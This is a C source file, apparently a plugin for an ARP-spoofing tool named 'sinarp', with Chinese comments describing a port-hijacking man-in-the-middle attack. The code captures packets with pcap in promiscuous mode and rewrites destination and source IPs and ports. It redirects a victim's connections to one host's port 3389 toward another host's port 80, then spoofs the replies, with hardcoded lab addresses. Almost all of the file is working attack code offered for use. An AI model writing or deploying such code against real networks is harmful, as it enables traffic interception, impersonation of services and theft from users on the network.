/*
端口劫持
如果一方企图连接到一个主机的一个端口 会被劫持 并转发到另外一个主机的另外一个端口

A -- > M-- > B
只需要单向欺骗就行了。。
让A 以为 M 是B

程序就是不关三七二十一只要端口 Ip 对上了 就转发。。

先判断目标的 ip 和 端口 如果符合要求 就更改其为 另外一个 ip 和端口 并将 这个包发给那个主机

貌似这个需要我们捕获到自己发出去的包啊……

如果是其他的电脑 我们直接使用回调函数里面的包 否则 我们自己启动一个线程来捕获包

A - M - B
｜
Ｃ

工作流程：
先是 A　给　B发送　ip　包
我们对比了　ｉｐ包的端口和ip后　确定需要拦截这个包
然后将包的　目标　ip　改成　C　的ip　并将包发给　C　（这里要不要拦截　C　发的包　把　源地址改为　B的　ｉｐ　呢？？）
然后　C　会和　A　建立连接　
如果要把包发给自己

启动个线程　拦截自己发出去的包　
截获　A　－－＞　Ｂ　的包的目标　ｉｐ　改为自己的　然后发给自己
然后截获自己发出去的包　把源ｉｐ改成B的ip再发出去　、、

我们可以发包给自己 然后操作系统又处理吗 ，，，可以的，，。


全局变量 和 私有函数的前缀为 ph

虚拟机环境测试不是很稳定
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#ifdef WIN32
#include <windows.h>
#endif
#include "../../sinarp.h"

uint32 ph_hjack_ip = 0;//inet_addr("192.168.244.131");
uint32 ph_spoof_ip = 0;
uint16 ph_hjack_port = 0;  //注意端口要转成网络字节序的
uint16 ph_spoof_port = 0;
uint16 ph_black_ip = 0;//一个不是活动的 ip
uint32 ph_remote_ip = 0 ;//用来在使用本机的时候 记住远处的 ip
BOOL ph_is_need_self_capture = FALSE;//是不是需要自己来捕获数据包 此时需要自己打开网卡 获得一个新的句柄
pcap_t *ph_pcap_handle = NULL;

/*
process_packet 里面接收不到 系统自己发出去的包 被设置的过滤器过滤了。
*/

BOOL  process_packet(ETHeader *ethdr, uint32 len) // 处理收到的 ip 包
{
    IPHeader *iphdr = (IPHeader *)(((uint8 *)ethdr) + 14);
    uint32 ip_len, data_len;
    uint8 *data_offset;
    uint32 pro_len;
    uint16 sport, dport;
    TCPHeader *tcphdr;
    UDPHEADER *udphdr;
    ip_len = (iphdr->iphVerLen & 0xf) * sizeof(unsigned long);
    if (iphdr->ipProtocol == PROTO_TCP)
    {
        // 找到TCP的位置
        tcphdr = (TCPHeader *) ((u_char *)iphdr + ip_len);
        pro_len = ((tcphdr->dataoffset >> 4) * sizeof(unsigned long));
        sport = ntohs(tcphdr->sourcePort);
        dport = ntohs(tcphdr->destinationPort );

        //printf("%s \n",(unsigned char *)iphdr + ip_len + pro_len);
    }
    else if (iphdr->ipProtocol == PROTO_UDP)
    {
        // 找到UDP的位置
        //我们不关心 UDP
        return TRUE;//交给上层转发

        udphdr = (UDPHEADER *) ((u_char *)iphdr + ip_len);
        pro_len = ntohs(udphdr->uh_len);
        sport = ntohs(udphdr->uh_sport);
        dport = ntohs(udphdr->uh_dport);
    }
    else
    {
        //不认识的东东  ICMP etc.
        return TRUE;
    }
    // 数据长度
    data_len = ntohs(iphdr->ipLength) - (ip_len + pro_len);
    // 指向数据的指针
    data_offset = (unsigned char *)iphdr + ip_len + pro_len;

    //sinarp_printf("%s\n","xxxx");

    if (iphdr->ipDestination == ph_hjack_ip)
    {
        //这是个发向 要欺骗目标的数据包  下面看看端口是不是要劫持的端口、
        if (tcphdr->destinationPort == ph_hjack_port)
        {
            //我们需要修改数据包 将目标 ip 和 端口 修改成 spoof ip 的端口和 ip
            sinarp_printf("\r%s\n", "hijack ----> spoof  !!!");
            iphdr->ipDestination = ph_spoof_ip;
            tcphdr->destinationPort = ph_spoof_port;

            if (iphdr->ipDestination == g_my_ip)
            {
                sinarp_printf("send packet to me ..\n");
                memcpy(ethdr->shost, g_my_mac, 6);
                memcpy(ethdr->dhost, g_my_gw_mac, 6); //发送给网关 然后再反射回来。。。
                iphdr->ipSource = ph_black_ip; //设为无效的 ip
                sinarp_checksum(iphdr);
                //发给我们自己
                if (pf_pcap_sendpacket(ph_pcap_handle, (uint8 *)ethdr, len) < 0)
                {
                    printf("\r[!] port_hijack: send packet failed !\r\n");
                }
                return FALSE;
            }
            sinarp_checksum(iphdr);
        }
    }
    else if (iphdr->ipSource == ph_spoof_ip)
    {
        if (tcphdr->sourcePort == ph_spoof_port)
        {
            //我们需要修改源 ip 和 端口为 hijack 的 ip 和 端

            if (iphdr->ipSource == g_my_ip)
            {
                sinarp_printf("\r%s\n", "spoof ----> hijack  !!!");
                iphdr->ipSource = ph_hjack_ip;
                tcphdr->sourcePort = ph_hjack_port;

                sinarp_checksum(iphdr);
                sinarp_forward_fix_packet(ethdr);
                if (pf_pcap_sendpacket(ph_pcap_handle, (uint8 *)ethdr, len) < 0)
                {
                    printf("\r[!] port_hijack: send packet failed !\r\n");
                }
                return FALSE;
            }

            sinarp_printf("\r%s\n", "spoof ----> hijack  !!!");
            iphdr->ipSource = ph_hjack_ip;
            tcphdr->sourcePort = ph_hjack_port;
            sinarp_checksum(iphdr);
        }
    }
    /*  else if(iphdr->ipSource == ph_hjack_ip)
        {
            if (tcphdr->sourcePort == ph_hjack_port)
            {
                sinarp_printf("%s","\rtry block ...\n");
                return FALSE;// 屏蔽这样的包。。
            }
        }
        */
    return TRUE;
}


void   ph_packet_handler(u_char *param, const struct pcap_pkthdr *header,
                         const u_char *pkt_data)
{
    ETHeader *eh;
    IPHeader *ih;
    ARPHeader *arp_hdr;
    BOOL bRet = FALSE;
    u_int ip_len = 0, pro_len = 0, data_len = 0;
    u_int pkt_len = header->len;
    uint32 idx = 0;
    eh = (ETHeader *) pkt_data;
    if (pkt_len < 14)
        return;

    //转发 ip 数据包。。
    if (eh->type != htons(ETHERTYPE_IP))
        return; // 只转发IP包

    // 找到IP头的位置和得到IP头的长度
    ih = (IPHeader *) ((u_char *)eh + 14); //14为以太头的长度

    sinarp_printf("\rrecv one \n");
    process_packet(eh, pkt_len);

    return;
}


void *ph_capture(void *x)
{
    int ret;

    while (!g_is_time_shutdown) //和 sinarp 共享变量
    {
        ret = pf_pcap_loop(ph_pcap_handle, 1, (pcap_handler)ph_packet_handler, NULL);
        if (ret == 0)
        {
            continue;
        }
        else
        {
            //pf_pcap_perror(g_adhandle,"break");
            break;
        }
    }
}

BOOL plugin_init()
{
    char errbuf[PCAP_ERRBUF_SIZE];
    char sniffer_filter[256];
    struct bpf_program fcode;

    ph_hjack_ip = inet_addr("192.168.244.122");
    ph_spoof_ip = inet_addr("192.168.244.128");
    ph_black_ip = inet_addr("192.168.244.244");
    ph_hjack_port = htons(3389);
    ph_spoof_port = htons(80);

    if (ph_spoof_ip == g_my_ip)
    {
        ph_is_need_self_capture = TRUE;
        if ((ph_pcap_handle = pf_pcap_open_live(g_opened_if_name, // device
                                                65536,     // portion of the packet to capture.
                                                // 65536 grants that the whole packet will be captured on all the MACs.
                                                1,       // promiscuous mode
                                                1, //a value of 0 means no time out
                                                errbuf     // error buffer
                                               )) == NULL)
        {
            sinarp_printf("failed open %s \n", g_opened_if_name);
            return FALSE;
        }

        //只捕获我们自己发出去的包
        sprintf(sniffer_filter, "tcp src port %u", htons(ph_spoof_port));

        sinarp_printf("filter: %s \n", sniffer_filter);

        if (pf_pcap_compile(ph_pcap_handle, &fcode, sniffer_filter, 1, g_my_netmask) < 0)
        {
            sinarp_printf("%s", "\nUnable to compile the packet filter\n");
            /* Free the device list */
            goto clean;
        }
        //设置过滤器
        if (pf_pcap_setfilter(ph_pcap_handle, &fcode) < 0)
        {
            sinarp_printf("%s", "\nError setting the filter.\n");
            /* Free the device list */
            goto clean;
        }
        sinarp_printf("\rport_hijack start capture thread \n");
        sinarp_create_thread(ph_capture, NULL);
    }
    else
    {
        ph_is_need_self_capture = FALSE;
    }

    return TRUE;
clean:
    pf_pcap_close(ph_pcap_handle);
    return FALSE;
}

void *plugin_unload()
{
    if (ph_is_need_self_capture)
    {
        pf_pcap_breakloop(ph_pcap_handle);
        //Sleep(1000);
        pf_pcap_close(ph_pcap_handle);
    }
}

/*
BOOL __stdcall DllMain( HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved )
{
switch(dwReason)
{
case DLL_PROCESS_ATTACH:
{

        }
        break;
        case DLL_PROCESS_DETACH:
        {

          }
          break;
          default:
          break;
          }
          return TRUE;
          }
*/